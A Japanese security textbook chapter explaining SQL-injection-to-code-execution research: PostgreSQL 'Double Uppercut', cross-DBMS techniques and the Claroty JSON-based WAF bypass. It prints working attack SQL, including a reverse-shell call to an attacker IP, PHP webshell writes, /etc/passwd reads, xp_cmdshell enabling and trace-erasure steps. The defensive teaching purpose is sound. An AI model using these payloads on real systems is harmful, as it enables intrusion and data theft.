本節では、この「SQLi→RCE」の到達点として名高い2つの原典研究を精読する。1つはSteven Seeley（mr_me）による PostgreSQL の "Double Uppercut"（large object と `CREATE FUNCTION` のディレクトリトラバーサルを組み合わせた RCE）。もう1つは Claroty Team82 による "{JS-ON: Security-OFF}"（JSON構文を使って主要5ベンダーのWAFを一斉にすり抜けた研究）である。前者は「SQLiがどこまで昇格しうるか」の上限を、後者は「その攻撃をどうやって検知の目から隠すか」の最前線を示す。あわせて、DBMS横断でSQLi→RCEの主要技法を俯瞰する。

---

### 1. Double Uppercut：PostgreSQLでSQLiからRCEを取る

#### 前提条件と全体像

Steven Seeley（Source Incite）が2020年に公開した "SQL Injection Double Uppercut" は、認証済みのSQLiを起点に PostgreSQL 上で任意のネイティブコードを実行する手法である。成立には次の3つが必要になる。

- **DB スーパーユーザ権限**（`pg_largeobject` テーブルの直接操作と `CREATE FUNCTION ... LANGUAGE C` に必須）
- **スタッククエリ（stacked queries）**が使えること――1つの注入ポイントで `;` 区切りの複数文（`SELECT ...; UPDATE ...; CREATE FUNCTION ...`）を連続実行できること
- 標的の PostgreSQL の**バージョンとアーキテクチャに一致する共有ライブラリ**（Windowsなら `.dll`、Unixなら `.so`）を攻撃者側でコンパイルできること

> ⚠️ 用語補足: **large object（ラージオブジェクト、LO）** とは、PostgreSQL がBLOB的な巨大バイナリを扱うための仕組みで、実データはシステムテーブル `pg_largeobject` に「2048バイトごとのページ（`pageno`）」に分割されて格納される。`lo_import` / `lo_export` はサーバのファイルシステムとLOの間でデータをやり取りする関数で、いずれもスーパーユーザ権限を要する。**sink（入力が最終的に実行・解釈される危険な着地点）** はここでは「ディスクに書き出された共有ライブラリ」であり、それを `CREATE FUNCTION` でプロセスにロードさせるのが核心になる。

狙いは明快で、「(1) 攻撃者が用意した悪意ある共有ライブラリを PostgreSQL のデータディレクトリに書き込み、(2) `CREATE FUNCTION` でそれをロードして関数化し、(3) その関数を呼んでコードを実行させる」という3幕構成である。難所は (1) の「どこに書けるか」と (2) の「どこからロードできるか」を一致させる点にある。

#### 攻撃パイプライン（原典のSQLをそのまま追う）

**ステージ1：large object のエントリを作る**

```sql
select lo_import('C:/Windows/win.ini', 1337);
```

`lo_import` で既存の適当なファイル（ここでは `win.ini`）を読み込み、OID（オブジェクトID）`1337` を明示指定して `pg_largeobject` にLOエントリを作る。中身は後で全部上書きするので、この段階では「1337番のLOという入れ物を確保する」ことだけが目的である。

**ステージ2：LOの中身を悪意あるバイナリで上書きする**

```sql
update pg_largeobject SET pageno=0, data=decode('4d5a90...', 'hex') where loid=1337;
insert into pg_largeobject(loid, pageno, data) values (1337, 1, decode('74114d...', 'hex'));
```

コンパイル済みの共有ライブラリ（`4d5a...` は Windows PE の `MZ` シグネチャ）を16進エンコードし、`decode(..., 'hex')` でバイナリに戻して `data` 列に書き込む。ファイルが 2048 バイトを超える場合は、`pageno` を 0, 1, 2... と増やしながらページ単位で分割挿入する。**なぜページ分割が要るのか**：`pg_largeobject` の1行は仕様上1ページ（既定 2KB）までしか保持できないためで、大きなDLL/SOは必然的に複数行にまたがる。

**ステージ3：LOをファイルとして書き出す**

```sql
select lo_export(1337, 'poc.dll');
```

`lo_export` で1337番LOをファイル `poc.dll` に書き出す。相対パスで指定するとPostgreSQLの**データディレクトリ**に落ちる。ここが重要で、データディレクトリはPostgreSQLサービスアカウントが確実に書き込める場所であり、かつ次のステージで相対パス参照の起点になる。

**ステージ4：`CREATE FUNCTION` のディレクトリトラバーサルでロードする**

```sql
create function connect_back(text, integer) returns void
as '../data/poc', 'connect_back' language C strict;
```

これが "Double Uppercut" の決め手である。`CREATE FUNCTION ... AS '<ライブラリパス>', '<シンボル名>' LANGUAGE C` は、指定した共有ライブラリをサーバプロセスにロードし、その中の C 関数 `connect_back` をSQL関数として登録する。

**なぜ `../data/poc` なのか（原理）**：新しめの PostgreSQL では、`CREATE FUNCTION` に絶対パスや `$libdir` 外の任意パスを直接渡す経路が塞がれ、ライブラリは既定のライブラリディレクトリ（`.../lib` 配下）から解決されるよう制限された。しかし PostgreSQL はパス文字列を**そのまま相対パスとして解決する**ため、ライブラリディレクトリを起点に `../data/` へ**ディレクトリトラバーサル**すれば、ステージ3で書き込んだデータディレクトリ内の `poc` に到達できる。拡張子（`.dll`/`.so`）はPostgreSQLが自動付与するのでパスには書かない。つまり「書ける場所（data）」と「ロードの起点（lib）」の相対位置関係を突いて、制限を迂回している。これが旧バージョンの「UNCパス直接指定」を塞いだ修正をさらに回避する第2撃であり、名前の由来（ダブル＝2段の連打）でもある。

**ステージ5：実行**

```sql
select connect_back('192.168.100.54', 1234);
```

登録した関数を呼ぶだけで、ライブラリ内のネイティブコードがPostgreSQLプロセスの権限で走る。この例では攻撃者ホスト `192.168.100.54:1234` へリバースシェルを張る。実行コンテキストは Windows では `NETWORK SERVICE`、Unix では `postgres` ユーザとなる。

**後始末（痕跡消去）**

```sql
SELECT lo_unlink(l.oid) FROM pg_largeobject_metadata l;
DROP FUNCTION connect_back(text, integer);
```

作成したLOと関数を削除して痕跡を減らす。

#### バージョン・分類・関連手法

- **対象**：近代の PostgreSQL（記事では 12 系まで検証）。Windows・Unix いずれも対象。9.x 系では固定UNCパスによるロードが可能だったが、その経路が塞がれた後でも本手法（相対トラバーサル）は有効であった。
- **CVE / 深刻度**：ベンダー（PostgreSQL）はこれを「仕様（feature）」と分類しCVEは付与されていない。記事はCVSS 4.1（`AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:L`）と評価している。高権限（スーパーユーザ）を前提とするため、評価上は「機能の悪用」の範囲に留まる点に注意。
- **関連する別経路**（記事が言及）：
  - **Jacob Wilkin** の `COPY FROM PROGRAM` を使う手法（後述。より単純だがPostgreSQL 9.3以降の機能に依存）。
  - **Denis Andzakovic** の `postgresql.conf` 改変によるUnix限定手法（スタッククエリ不要という利点がある）。

**この研究の教訓**：スーパーユーザで動くDBは「OSに片足を突っ込んだプロセス」であり、LO・`CREATE FUNCTION`・ファイル入出力といった正規機能の組み合わせだけで、単一のバグに頼らずRCEへ到達できる。防御は「アプリ用DBユーザに絶対にスーパーユーザ権限を与えない」「`pg_largeobject` や `CREATE FUNCTION` を一般ロールから剥奪する」に尽きる。

> 出典: SQL Injection Double Uppercut: How To Achieve Remote Code Execution Against PostgreSQL — https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html

---

### 2. DBMS横断で見る SQLi→RCE の主要技法

Double Uppercut は PostgreSQL に特化した精緻な例だが、「SQLi→RCE」はDBMSごとに定石がある。ここでは各DBMSでの代表的な到達経路を、前提条件（何の権限・設定が要るか）とともに整理する。RCEの多くは、①**ファイル書き込み**でWebシェルを置く、②**OSコマンド実行機能**を直接叩く、の2系統に大別できる。

#### MySQL / MariaDB

**`INTO OUTFILE` によるWebシェル設置**（要 `FILE` 権限、`secure_file_priv` が書込先を許容していること）

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

クエリ結果をサーバのファイルに書き出す機能を悪用し、Web公開ディレクトリにPHPのWebシェルを設置する。あとは `http://target/shell.php?cmd=whoami` で任意コマンドを実行できる。**なぜ成立するか**：`INTO OUTFILE` はDBプロセスの権限でファイルを新規作成する正規機能であり、書き込み先がWebサーバの配信対象なら「DB経由でPHPを植える」だけでコードが実行環境に載る。

**`LOAD_FILE()` によるファイル読み出し**（直接のRCEではなく、鍵ファイルや設定を読み取って昇格の足がかりにする）

```sql
SELECT LOAD_FILE('/etc/passwd');
```

#### Microsoft SQL Server（MSSQL）

**`xp_cmdshell`**：MSSQLの拡張ストアドプロシージャで、OSコマンドを直接実行する。既定で無効なので、まず有効化する必要がある。

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

**`sp_OACreate`（OLE Automation）**：COMオブジェクトを生成してコマンドを起動する。`xp_cmdshell` が監視・無効化されている環境での代替手段。

```sql
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c whoami';
```

**リンクサーバ経由の実行**：他のSQL Serverへのリンク設定があれば、`AT` 句でリモート側の `xp_cmdshell` を呼べる。

```sql
EXEC('master..xp_cmdshell ''whoami''') AT [linked_server_name];
```

#### PostgreSQL

**`COPY ... TO/FROM`**（ファイル読み書き。Double Uppercut のLOと同じく高権限を要する）

```sql
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

**`COPY ... FROM PROGRAM`**（PostgreSQL 9.3以降。OSコマンドの標準出力をテーブルに取り込む＝実質的なコマンド実行）

```sql
COPY test_table FROM PROGRAM 'id';
```

**なぜ `COPY FROM PROGRAM` がRCEになるか**：本来は「外部プログラムの出力をインポートする」機能だが、`PROGRAM` に渡した文字列はサーバ上でシェル実行されるため、`id` でも `bash -c '...'` でも任意コマンドが走る。前掲の Double Uppercut（LO＋`CREATE FUNCTION`）はこの経路が塞がれている／ネイティブコード実行が欲しい場合の、より低レベルな代替と位置づけられる。

**UDF（ユーザ定義関数）**：`LANGUAGE C` で共有ライブラリの関数を登録する経路で、Double Uppercut がまさにこれを悪用している。

> ⚠️ **未取得の資料**: 元資料には Oracle の手法（`DBMS_SCHEDULER`、Java stored procedure、`UTL_FILE` など）への言及がありませんでした。Oracle でのSQLi→RCEに関しては、ご自身で追加調査されることをお勧めします。（以下は一般知識に基づく補足）Oracleでは `DBMS_SCHEDULER` や `DBMS_JAVA`、外部テーブルの `PREPROCESSOR` 句などが古典的なコマンド実行経路として知られており、いずれも高い権限を要する。

**横断的な教訓**：どのDBMSでも、RCEに至る経路は「①WebルートへのファイルWRITE」または「②DBが提供するコマンド/コード実行機能」のいずれかに帰着し、そのすべてが**高い権限（FILE権限・スーパーユーザ・sysadmin等）を前提**とする。したがって最も効くのは「アプリが使うDBアカウントを最小権限に絞る」ことである。

> 出典: SQL Injection to RCE — https://sallam.gitbook.io/sec-88/web-appsec/sql-injection/sql-to-rce

---

### 3. {JS-ON: Security-OFF}：JSON構文による主要WAF一斉バイパス

前節までの攻撃は「どうやってDBを深く突くか」の話だった。実運用では、その手前に**WAF（Web Application Firewall）**が立ちはだかる。Claroty Team82 の Noam Moshe が 2022年12月8日 に公開した "{JS-ON: Security-OFF}" は、**JSON構文**という一手で主要5ベンダーのWAFを軒並みすり抜けた原典研究であり、WAFバイパスの本質（パーサ差分）を最も鮮やかに示した事例として知られる。

#### 影響を受けたベンダーと発見の経緯

回避に成功したWAFは次の5つ：

- **Palo Alto Networks**（Next-Generation Firewall）
- **Amazon Web Services**（AWS ELB/WAF）
- **Cloudflare**
- **F5**（BIG-IP）
- **Imperva**

一方、Check Point の CloudGuard AppSec と open-appsec は当初からこの攻撃を検知できていた（免疫があった）。

きっかけは、Cambium Networks の cnMaestro プラットフォームの脆弱性 **CVE-2022-1361** の調査だった。そこでは「開発者がプリペアドステートメント（パラメータ化クエリ）を使っていなかった」ためSQLiが成立していた。研究者はこのSQLiを実際のWAF越しに通せるかを検証する過程で、JSON構文がWAF検知の共通の盲点になっていることを発見した。

#### なぜWAFはすり抜けられたのか（原理＝パーサ差分）

WAFがSQLiを検知する方法は大きく2つある。

1. **ブラックリスト（キーワード検知）**：`union select`、`or 1=1`、`sleep(` などの危険な文字列にマッチさせる。
2. **SQL構文の部分解析**：受け取った文字列を「SQLとして」解析し、injectionらしい構造かを判定する。

問題は、**「すべての主要RDBMS（MSSQL・PostgreSQL・SQLite・MySQL）が10年近く前からネイティブにJSON構文をサポートしている」のに、WAFベンダーはそのJSON構文の解析を実装してこなかった**という非対称性にあった。研究者はこれを「WAFのパーサとデータベースエンジンの間のミスマッチ（parser differential）そのものが JSON だった」と表現している。

**具体的な破綻の仕方**：WAFの構文解析器にJSON演算子（後述の `@>` `<@` `->` `#>` など）を含んだ文字列を食わせると、WAFは**それを正当なSQLとして解釈できずに構文解析でつまずく**。多くのWAFは「解析に失敗した＝おそらく無害な文字列」と扱う（あるいは危険構造として認識できない）ため、ペイロード全体を**通してしまう**。ところがバックエンドのDBは同じ文字列をJSON演算を含む正しいSQLとして完璧に解釈し、注入が成立する。つまり「WAFには読めず、DBには読める」構文を先頭に置くことで、検知の目を潰している。これは本教科書で繰り返し出てくる「WAFはSQLパーサそのものではない」という原理の、最も強力な実例である。

#### 悪用に使われたJSON演算子と実例

各DBがサポートするJSON構文の例（いずれもWAFのシグネチャ・構文解析を混乱させた）：

**PostgreSQL（`<@` = 包含（containment）判定）**

```sql
'{"b":2}'::jsonb <@ '{"a":1, "b":2}'::jsonb
```

`<@` は「左のJSONが右のJSONに含まれるか」を判定する演算子で、この式は PostgreSQL 上で真（true）に評価される。これをSQLiペイロードの先頭に前置すると、WAFのSQLパーサは `::jsonb` や `<@` を解釈できずに解析を放棄する一方、DBは正しく評価してペイロードの後続部分を実行する。`@>`（包含の向き逆）、`?`/`?|`/`?&`（キー存在判定）、`#>`/`#>>`（パス取得）、`->`/`->>`（要素取得）など、PostgreSQLのJSONB演算子群が同様に利用できる。

**SQLite（`->` = JSONパス抽出）**

```sql
'{"a":2,"c":[4,5,{"f":7}]}' -> '$.c[2].f' = 7
```

JSONパス `$.c[2].f` で値 `7` を取り出し比較する式。これも真に評価される。

**MySQL（`JSON_EXTRACT` 関数）**

```sql
JSON_EXTRACT('{"id": 14, "name": "Aztalan"}', '$.name') = 'Aztalan'
```

`JSON_EXTRACT` でキー `name` の値を取り出して比較する。演算子記法（`->`）ではなく関数形式だが、WAFのブラックリストにJSON関数が載っていない点を突く発想は同じである。

> ⚠️ **一部未取得**: 記事内で cnMaestro（CVE-2022-1361）に対して実際に送信された「WAFにブロックされる素のペイロード」と「JSON前置で通った最終ペイロード」の完全な対応文字列は、自動取得したテキストからは特定できませんでした。原典の該当スクリーンショット・ペイロードは以下から直接ご確認ください: https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf （以下は未取得部分の補足として一般知識に基づく解説です）実務上の典型は、`' OR 1=1 --` のような素のブール注入がWAFに弾かれる場合に、前置または内部に `'{"a":"b"}'::jsonb @> '{"a":"b"}'` のようなJSON式を織り込み、WAFの構文解析を破綻させつつDBには真を返させる、という組み立てである。

#### 影響とツール化

研究チームは発見した手法を**SQLMap**（自動SQLi攻撃ツール）に統合し、JSONバイパスを含むペイロードでWAF保護下の標的を自動攻撃できることを実証した。これにより、この手法は個別の職人技ではなく「誰でも自動化して撃てる」現実的な脅威となった。各WAFベンダーはその後JSON構文への対応（署名追加・パーサ拡張）を進めたが、この研究は「WAFの検知は本質的にDBパーサの後追いであり、DBが受理する新構文は常に検知の穴になりうる」という教訓を残した。

**時事性の注記**：本手法は2022年12月時点で有効だったもので、報告後に主要ベンダーは順次シグネチャを更新している。したがって「今すぐ全WAFに効く魔法」ではないが、①WAFに依存した防御の限界を示す原理的な事例として、②新しいDB構文（JSON以外にも将来登場しうる）が同じ穴を再生産しうるという警告として、今なお価値がある。

> 出典: {JS-ON: Security-OFF}: Abusing JSON-Based SQL to Bypass WAF — https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf

---

### まとめ

本節の3資料は、SQLiの「攻め」と「隠し」の両極を示している。

- **Double Uppercut** は、PostgreSQLの正規機能（large object＋`CREATE FUNCTION`）だけを組み合わせ、`../data/` への相対トラバーサルという一点でロード制限を破ってRCEに到達する。単一の実装バグではなく「機能の合成」で最終目的を達する好例であり、防御の要は**DBアカウントの最小権限化**に尽きる。
- **DBMS横断のSQLi→RCE** は、①WebルートへのファイルWRITE、②DB内蔵のコマンド/コード実行機能、という2系統に整理でき、いずれも高権限を前提とする。攻撃面を減らす鍵はやはり権限設計にある。
- **{JS-ON: Security-OFF}** は、WAFとDBの「パーサ差分」を JSON という具体で突き、主要5ベンダーを一斉に破った。これは「WAFはSQLパーサそのものではない」という本教科書共通の原理の決定版であり、**根本防御はプレースホルダ（パラメータ化クエリ）による構文とデータの完全分離**であって、WAFはあくまで多層防御の一層に過ぎないことを再確認させる。

---

[← 第5章 WAF回避／フィルタバイパス](05-waf-bypass.md) ｜ [📖 目次](index.md) ｜ [第7章 ツール習熟（sqlmap・Ghauri・手動vs自動） →](07-tooling.md)
